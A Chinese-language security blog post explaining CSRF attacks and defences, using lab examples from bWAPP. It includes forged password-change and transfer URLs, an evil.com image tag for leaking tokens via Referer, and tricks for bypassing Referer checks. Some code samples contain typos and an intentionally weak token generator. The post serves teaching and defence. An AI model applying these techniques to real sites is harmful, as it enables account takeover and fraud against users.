<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Focusing on security of AI, and distributed AI."><title>CSRF 漏洞 | realyee's blog</title><link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/blog/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/blog/favicon.ico"><link rel="apple-touch-icon" href="/blog/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/blog/apple-touch-icon.png"><script src="https://www.googletagmanager.com/gtag/js?id=G-HT3KXNPC43" async></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-HT3KXNPC43');
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement('script');
  hm.src = 'https://hm.baidu.com/hm.js?' + '81692a5a3ea48096c98733a7d4bfef6b';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><div class="darkmode-toggle">🌓</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
var toggle = document.querySelector('.darkmode-toggle');
var html = document.querySelector('html');

html.dataset.dark = localStorage.dark || prefersDarkMode.matches;

toggle.addEventListener('click', () => {
localStorage.dark = !(html.dataset.dark == 'true');
html.dataset.dark = localStorage.dark;
});</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CSRF 漏洞</h1><a id="logo" href="/blog/.">realyee's blog</a><p class="description">Security and privacy of AI, and distributed AI, Cybersecurity</p></div><div id="nav-menu"><a class="current" href="/blog/."><i class="fa fa-home"> Home</i></a><a href="/blog/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/blog/tags/"><i class="fa fa-tag"> Tags</i></a><a href="/blog/history/"><i class="fa fa-book"> History</i></a><a href="/blog/cheatsheet/"><i class="fa fa-user"> Cheatsheet</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CSRF 漏洞</h1><div class="post-meta">2019-10-05<span> | </span><span class="category"><a href="/blog/categories/websec/">websec</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 4.9k</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 18</span><span class="post-meta-item-text"> Minutes</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">CSRF 漏洞定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">CSRF 漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84-cookie-%E6%9C%BA%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">浏览器的 Cookie 机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">两种表现形式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.</span> <span class="toc-text">CSRF 危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.</span> <span class="toc-text">CSRF 类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-%E5%9E%8B-csrf"><span class="toc-number">5.1.</span> <span class="toc-text">Get 型 CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80"><span class="toc-number">5.1.1.</span> <span class="toc-text">案例一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C"><span class="toc-number">5.1.2.</span> <span class="toc-text">案例二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#post-%E5%9E%8B-csrf"><span class="toc-number">5.2.</span> <span class="toc-text">Post 型 CSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">CSRF 漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%80%85%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">6.1.</span> <span class="toc-text">使用者的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer-check-%E9%98%B2%E5%BE%A1"><span class="toc-number">6.2.</span> <span class="toc-text">Referer Check 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token-%E9%98%B2%E5%BE%A1"><span class="toc-number">6.3.</span> <span class="toc-text">Token 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%93%8D%E4%BD%9C%E4%BA%8C%E6%AC%A1%E9%AA%8C%E8%AF%81"><span class="toc-number">6.4.</span> <span class="toc-text">敏感操作二次验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%98%B2%E5%BE%A1"><span class="toc-number">6.4.1.</span> <span class="toc-text">验证码防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%8F%8A%E6%8E%A8%E8%8D%90"><span class="toc-number">6.5.</span> <span class="toc-text">参考及推荐</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E6%A3%80%E6%B5%8B"><span class="toc-number">7.</span> <span class="toc-text">CSRF 检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%B4"><span class="toc-number">7.0.1.</span> <span class="toc-text">HTTP 自定义头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.0.2.</span> <span class="toc-text">GET 类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E8%A1%A5%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">漏洞修补逻辑分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90-token-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">8.1.</span> <span class="toc-text">生成 Token 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-token-%E8%BF%9B%E8%A1%8C-csrf-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.2.</span> <span class="toc-text">使用 Token 进行 CSRF
漏洞防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">CSRF 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#a-%E6%A0%87%E7%AD%BE%E7%9A%84-href"><span class="toc-number">9.1.</span> <span class="toc-text">a 标签的 href</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe-%E6%A0%87%E7%AD%BE%E7%9A%84-src"><span class="toc-number">9.2.</span> <span class="toc-text">iframe 标签的 src</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84-iframe"><span class="toc-number">9.3.</span> <span class="toc-text">隐藏的 iframe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#img-%E6%A0%87%E7%AD%BE%E7%9A%84-src"><span class="toc-number">9.4.</span> <span class="toc-text">img 标签的 src</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#css-backgroud-%E5%88%A9%E7%94%A8"><span class="toc-number">9.5.</span> <span class="toc-text">CSS-backgroud 利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-json"><span class="toc-number">9.6.</span> <span class="toc-text">构造 JSON</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E8%B5%84%E6%96%99"><span class="toc-number">10.</span> <span class="toc-text">推荐资料</span></a></li></ol></div></div><div class="post-content"><h1 id="csrf-漏洞定义">CSRF 漏洞定义</h1>
<p>CSRF（Cross-Site Request Forery）也被称为 One Click Attack 或者
Session Riding，通常缩写为 CSRF 或者 XSRF</p>
<p>XSS 与 CSRF 区别：</p>
<ol type="1">
<li>XSS 利用站点内的信任用户，盗取 Cookie</li>
<li>CSRF 通过伪装成受信任用户请求受信任的网站</li>
</ol>
<h1 id="csrf-漏洞原理">CSRF 漏洞原理</h1>
<p>CSRF
是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作，通常由于服务端没有对请求头做严格过滤引起的。CSRF
会造成密码重置、用户伪造等问题，可能引发严重后果。</p>
<p>绝大多数网站是通过 Cookie
等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过
XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie
的浏览器端）发起用户锁不知道的请求。CSRF
攻击会令用户在不知情的情况下攻击自己已经登陆的系统。</p>
<p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p>
<p>可以这么理解 CSRF
攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF
能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账.……造成的主要问题包括：个人隐私的泄露以及财产安全。</p>
<p>例如：简单的转账案例</p>
<p>初始化链接：<code>http://www.xxx.com/pay.php?user=xxx&amp;money=100</code></p>
<p>黑客构造以下恶意链接，然后诱导用户在登录状态下点击该链接，便可以实现向自己转账的目的。</p>
<p><code>http://www.xxx.com/pay.php?user=恶意用户&amp;money=10000</code></p>
<h1 id="浏览器的-cookie-机制">浏览器的 Cookie 机制</h1>
<h2 id="两种表现形式">两种表现形式</h2>
<ol type="1">
<li><p>本地 cookie， 又称持久性 Cookie</p>
<p>服务器端脚本语言向客户端发送 cookie，发送时定制了时效、过期时间
expire，存储在<strong>本地</strong>。</p></li>
<li><p>临时性 Cookie， 又称 Session Cookie</p>
<p>没有定义 expire
字段，存储在<strong>浏览器内存</strong>中，关闭浏览器，cookie
失效。</p></li>
</ol>
<h1 id="csrf-危害">CSRF 危害</h1>
<ol type="1">
<li><p>发送邮件。</p></li>
<li><p>修改账户信息</p></li>
<li><p>资金转账</p></li>
<li><p>XSS 与 CSRF</p></li>
<li><p>CSRF 蠕虫</p></li>
</ol>
<h1 id="csrf-类型">CSRF 类型</h1>
<h2 id="get-型-csrf">Get 型 CSRF</h2>
<p>假如微博存在 CSRF 漏洞，有一个 GET
请求让别人点击后，关注我，这时可以做一些诱导性的博客。例如想让每一个用户都帮助自己转发微博，制造一次蠕虫攻击，找到转播文章的页面与关注我的页面，写一个
POC，用 <code>&lt;iframe&gt;</code> 标签来加载 URL，加载两条
URL，这时当用户点击会关注并且自动转发。</p>
<h3 id="案例一">案例一</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//会话验证，一般是客户端向服务端发送之前的 session_id	&lt;——————确认用户已经登陆</span><br><span class="line">	$user = $_GET[&#x27;user&#x27;];</span><br><span class="line">	$money = $_GET[&#x27;money&#x27;];</span><br><span class="line">	//转账操作				&lt;————————开始转账</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p>由此得出 CSRF 成功利用的条件：</p>
<ol type="1">
<li>用户已经登陆系统</li>
<li>用户访问对应 URL</li>
</ol>
<p>CSRF 漏洞利用：</p>
<p>bWAPP 的 CSRF</p>
<p>CSRF（Change Password）</p>
<p>本关特征：</p>
<ol type="1">
<li><p>只输入新密码，不用输入旧密码</p></li>
<li><p>使用 get 方式提交。</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=hack&amp;password_conf=hack&amp;action=change</span><br></pre></td></tr></table></figure></p>
<p>get 参数中直接暴露新密码以及第二次确认的新密码</p></li>
</ol>
<p>我们可以直接伪造修改密码的 URL，比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=bug&amp;password_conf=bug&amp;action=change</span><br></pre></td></tr></table></figure>
<p>然后诱导用户在登录该网站的状态下，点击该链接，便可以达到恶意修改密码的目的。</p>
<p>诱导的方式可以有很多种，比如：隐蔽利用 img 标签的 src 属性</p>
<p>当然，实际环境中，基本不会出现具有这样特征的修改密码方式，但这对我们了解
CSRF 的原理有着一定的帮助。</p>
<p><strong>以下的 GET 和 POST 类型的 CSRF
都是由于没有对用户身份进行验证导致的</strong>，因此可以由攻击者另外构造恶意的网页来进行攻击，如果对用户身份进行了验证，那么就不能单独构造网页了。</p>
<h3 id="案例二">案例二</h3>
<p>添加新用户</p>
<p>代码分析</p>
<p><strong>没有验证用户身份（session、cookie 等）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;INSERT INTO `adminsql`(`id`, `username`, `password`) VALUES(13, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = mysq1_query（<span class="variable">$sq1</span>）；<span class="comment">//执行sql插入语句</span></span><br><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;SELECT * FROM adminsql&quot;</span>；</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysq1_query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="title function_ invoke__">mysq1_fetch_array</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;user:<span class="subst">&#123;$rowsI&#x27;username&#x27;]&#125;</span>-----pass:<span class="subst">&#123;$rows[&#x27;password&#x27;]&#125;</span>&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用</p>
<p>同上面 bWAPP change password 的利用，隐蔽利用 img 标签的 src
属性，比如：我们构造一个网页，网页中设置一个 img 的 src
为恶意连接，那么用户在登录状态下，访问我们发给他的网页，就会发送恶意的
URL， 从而添加新用户。</p>
<h2 id="post-型-csrf">Post 型 CSRF</h2>
<p>添加新用户</p>
<p>代码分析</p>
<p>同 GET 也<strong>没有进行用户身份验证</strong>，只是获取参数是使用
POST 获取。</p>
<p>代码利用</p>
<p>利用 hidden 的 input
标签，我们构造恶意网页，网页中显示一些诱惑信息，并且写一个 form
表单，表单的 action 则是存在 CSRF 的网页链接。我们将提前查看的 POST
的数据值对，进行修改，然后在网页中加入 hidden 的 input， name 属性按照
post 的值进行填写， value
我们自己构造一个恶意的。然后诱导用户访问该网页就可以了</p>
<h1 id="csrf-漏洞防御">CSRF 漏洞防御</h1>
<h2 id="使用者的防御">使用者的防御</h2>
<p>CSRF
攻击之所以能成立，是因为使用者在被攻击的网页是处于已经登入的状态，所以才能做出一些行为。虽然说这些攻击应该由网页那边负责处理，但如果你担心网页会处理不好的话，你可以在每次使用完网站就登出，就可以避免掉
CSRF。不过，这怕是废话，还要用户注意这个安全，要你网站安全人员有个球用。</p>
<h2 id="referer-check-防御">Referer Check 防御</h2>
<p>原理</p>
<p>HTTP Referer 是 header 的一部分，当浏览器向 web
服务器发送请求的时候，一般会带上 Referer，告诉服
务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
<p>Referer Check 防御</p>
<p>Referer Check
主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。
比如用户修改密码，一定是在登录系统后台之后进行操作。所以在修改提交表单的时候，一定会从系统
后台页面提交，携带 Referer 头。如果 Referer
不是当前系统的域，那么极有可能遭受 CSRF。
缺陷：服务器并非任何时候都可以取到 Referer。例如 HTTPS 跳转到 HTTP。</p>
<p>当用户点击被构造好的 CSRF 利用页面，那么在执行用户对应操作时，提交的
HTTP 请求中就有对应的 Referer 值，此时服务端判断 Referer
值是否与服务器的域名信息有关。如果不相关则不执行操作。</p>
<p>Referer 防御代码编写</p>
<p>在 PHP 中使用 $_SERVER[‘HTTP_REFERER] 获取页面提交请求中的 referer
值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(strpos($_SERVER[‘HTTP_REFERER], &#x27;xx.com&#x27;) !== FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		判断成功</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	｛</span><br><span class="line">		判断失败</span><br><span class="line">	｝</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如何绕过 Rreferer</p>
<p>技巧：如果服务器端只判断当前 Referer
中是否具有域名，那么直接可以新建文件夹。即：在我们站点当中新建一个以该域名为名字的文件夹，然后将恶意文件放入该文件夹中，那么
Referer 中就可以匹配到该域名</p>
<h2 id="token-防御">Token 防御</h2>
<p>是否设置 Token， 用户每次访问都验证 Token，这样 CSRF
漏洞也就不复存在了</p>
<p>Anti CSRF Token 防御</p>
<p>CSRF 本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。
那么防御措施就是生成一个随机且不被轻易猜测的参数。目前大多数防御都采用
token（不可预测）。</p>
<p><strong>为什么 token 可以防御 CSRF？</strong></p>
<p>正常来说，比较容易理解的是，正确的 CSRFtoken 被放在了服务器的 Session
文件中。而 seesion id 一般会被被放在了 cookie 中。</p>
<p>当用户执行增删改操作的时候，服务器会根据 cookie 中的 session id
匹配<code>用户对应的 Session 文件</code>（位于服务端），然后从中取出这个
Token 值和用户提交到服务器的 Token 值(这里一般为表单中的 hidden 的 input
标签提交 token)做对比（即：HTTP 请求中的
token）。如果两者数值相同，用户的增删改操作才是被允许执行的，否则用户的请求就是不合法的，即
CSRF。</p>
<p>用户正常操作产生的 Token 是请求页面通过使用 JS
生成的随机数。这个随机数和用户 Session （位于服务端）中的随机数绑定。
但攻击者伪造的链接中，无法计算或者伪造出这个随机数。 因为 HTTP
请求中攻击者伪造出的随机数和用户 Session
中保存的随机数不同，服务器可依据该随机数判断出该请求不是来自用户正常操作，从而拒绝用户请求。</p>
<p>浏览器的同源策略：协议、IP、端口号不同的的 URL
被浏览器视为不同的源。JS 无法跨源获取用户 Cookie 的值。 而且一般来说
Cookie 中的关键字段都有 Http only 属性。拥有该属性的 Cookie
值，即便是同源环境内 Javascript 也无法对其执行操作。所以 <strong>cookie
中的内容</strong> 对攻击者是不可见的。</p>
<p>Token 泄露</p>
<p>GET 型 Token
泄露，<strong>如果页面可以包含访问攻击者的站点</strong>（但没有 XSS
要求那么高），如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http:/evil.com/&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>那么请求中的 Referer 就会携带对应的 GET Token。</p>
<p>POST 型 Token 泄露</p>
<p>利用 XSS 漏洞读取 Cookie，获取存储在其中的 Token 值。</p>
<h2 id="敏感操作二次验证">敏感操作二次验证</h2>
<ol type="1">
<li>一般情况下，使用 JavaScript
验证（比如：提醒用户该操作是否继续），但是是否执行成功取决于用户，不建议使用。</li>
<li>验证码强制验证</li>
</ol>
<h3 id="验证码防御">验证码防御</h3>
<p>验证码防御被认为是对抗 CSRF 最为简单而且有效的防御方法。 CSRF
在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。
通常情况下，验证码能够很好的遏制 CSRF。</p>
<p>出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不能作为防御
CSRF 的主要解决方案。</p>
<ul>
<li>验证码防御也可以被认为是二次验证</li>
</ul>
<h2 id="参考及推荐">参考及推荐</h2>
<p><a
target="_blank" rel="noopener" href="https://juejin.im/post/5bc009996fb9a05d0a055192#heading-14">前端安全系列之二：如何防止
CSRF 攻击？</a></p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/sdb5858874/article/details/81666194">为什么
CSRF Token 写在 COOKIE 里面</a></p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/wabiaozia/article/details/75196939">关于
Token，你应该知道的十件事</a></p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15096707/article/details/51307024">web
安全之 token 和 CSRF 攻击</a></p>
<p><a
target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000017831088#articleHeader10">彻底弄懂
session，cookie，token</a></p>
<h1 id="csrf-检测">CSRF 检测</h1>
<p>CSRF
是伪造<strong>用户的请求</strong>，所以首先需要清楚用户可以做哪些操作、发哪些请求。</p>
<p>常见的地方：转账，修改用户资料、密码，购买东西、删除文章</p>
<p>手工检测：不必说了，在常见场景下手动检测</p>
<p>半自动检测：常用 BurpSuite，还有 CSRFTester</p>
<p>全自动检测：主要是插件，目前也有现成的</p>
<h3 id="http-自定义头">HTTP 自定义头</h3>
<p>如果 Web 应用程序的 HTTP
请求中没有对应的预防措施，那么很大程度上就确定存在 CSRF 漏洞。</p>
<p>情况 A: 无 token 无 referer 验证</p>
<p>情况 B： 无 token 有 referer 验证这种情况比较常见，也许我们抓包发现无
token 正庆幸时，删除 referer 重新提交一看发现报错了 一. 我们可以试试空
referer: 即删除 header 中的 referer 的值，如果服务器只是验证了是否存在
referer 没验证 referer 值 的话，我们重新提交会发现一个 CSRF
漏洞又被发现了~因为所有跨协议传递的请求都是不会送 referer 的，如
https-&gt;http ,(这个利 用成本有点高）还有 javascript-&gt;http,
data-&gt;http.</p>
<p>二. 如果直接去掉 referer 参数请求失败，这种还可以继续验证对 referer
的判断是否严格，是否可以绕过。</p>
<p>修改 referer 值：如果原 referer 值为 Referer： t.qq.com/xxxx
话，我们可以试试修改为 Referer:
t.qq.com.baidu.com/xxx。如果服务器只是验证了 referer 是否存在 qq.com
或者 t.qq.com 等关键词的话，争对前一种
情况，我们可以在腾讯某子站点（http://xx.qq.com）发个帖子将图片地址修改为我们构造的csrf链接或者写好CSRF表单后将地址发布在
微博上等待其它用户点击，针对后一种情况我们可以建立个
t.qq.com.yourdomain.com 的域名存放 CSRF 表单来绕过 REFERER 检测;</p>
<p>当只采用 refer 防御时，可以把请求中的修改成如下试试能否绕过：</p>
<p>原始 refer：<code>http://test.com/index.php</code></p>
<p>测试几种方式（以下方式可以通过的话即可能存在问题）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://test.com.attack.com/index.php</span><br><span class="line"></span><br><span class="line">http://attack.com/test.com/index.php</span><br></pre></td></tr></table></figure>
<h3 id="get-类型">GET 类型</h3>
<p>如果有 token 等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在
CSRF 漏洞。</p>
<p>POST 类型</p>
<p>​ 如果有 token
等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉 referer
参数的内容，如果仍然可以，说明存在 CSRF 漏洞，可以利用构造外部 form
表单的形式，实现攻击。</p>
<p>改 Method</p>
<p>有些程序后端可能是用 REQUEST 方式接受的，而程序默认是 POST
请求，其实改成 GET 方式请求也可以发送过去，存在很严重的隐患。</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/eth10/1974796">CSRF
简单判断方法</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3729421.html">CSRF
手工测试方法</a></p>
<p><a
target="_blank" rel="noopener" href="https://www.lstazl.com/csrf%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">CSRF
漏洞复习总结</a></p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/84955701">CSRF
安全测试流程</a></p>
<h1 id="漏洞修补逻辑分析">漏洞修补逻辑分析</h1>
<p>CSRF
漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。</p>
<p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确，执行操作。不正确，则不执行操作。
一般情况下，给予的令牌会写入表单中隐藏域的 value
值中，随着表单内容进行提交。</p>
<p>登录验证 login.php --&gt; 登录成功执行操作，操作过程中有 cookie
提交的身份凭证 ---&gt; 登录后执行操作（增删改查）---&gt;
没有登录成功执行操作自动跳回登录页面</p>
<p>远程构造 CSRF 利用 POC，用户点击，就会发送同时携带 session
的请求，成功利用
POC。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止
CSRF。如果令牌不正确，那么不执行操作。并给出提示内容。</p>
<p>登录成功后，给与唯一令牌</p>
<p>增删改部分给与令牌，并在提交操作时，提交令牌并进行验证。一般情况下，使用表单
hidden 进行提交，或者 Cookie。</p>
<h2 id="生成-token-代码分析">生成 Token 代码分析</h2>
<p>Token
作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以被破解的内容</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function generateToken()&#123;</span><br><span class="line">	$salt = &#x27;test&#x27;.data(&#x27;Y/m/d&#x27;)</span><br><span class="line">	$token = md5($salt)</span><br><span class="line">	return $token</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是上述代码的 salt 容易被破解</p>
<ol type="1">
<li>颗粒度是日，容易被猜测，因此我们可以改成时分秒。</li>
<li>test 容易被猜解，可以改成随机长串</li>
</ol>
<h2 id="使用-token-进行-csrf-漏洞防御">使用 Token 进行 CSRF
漏洞防御</h2>
<ol type="1">
<li><p>登录验证成功之后，在会话 SESSION['user_token"] 中保存
Token。</p></li>
<li><p>在后台操作中，增删改表单中添加隐藏域 hidden，设置 Value 为
Token。</p></li>
<li><p>提交之后进行验证 Token 是否正确。</p></li>
</ol>
<h1 id="csrf-漏洞利用">CSRF 漏洞利用</h1>
<ol type="1">
<li>CSRF 的攻击建立在浏览器与 Web 服务器的会话中</li>
<li>欺骗用户访问 URL</li>
</ol>
<h2 id="a-标签的-href">a 标签的 href</h2>
<p>在 html 中，a
标签代表链接，可以将当前的”焦点”指引到其他位置。移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应。</p>
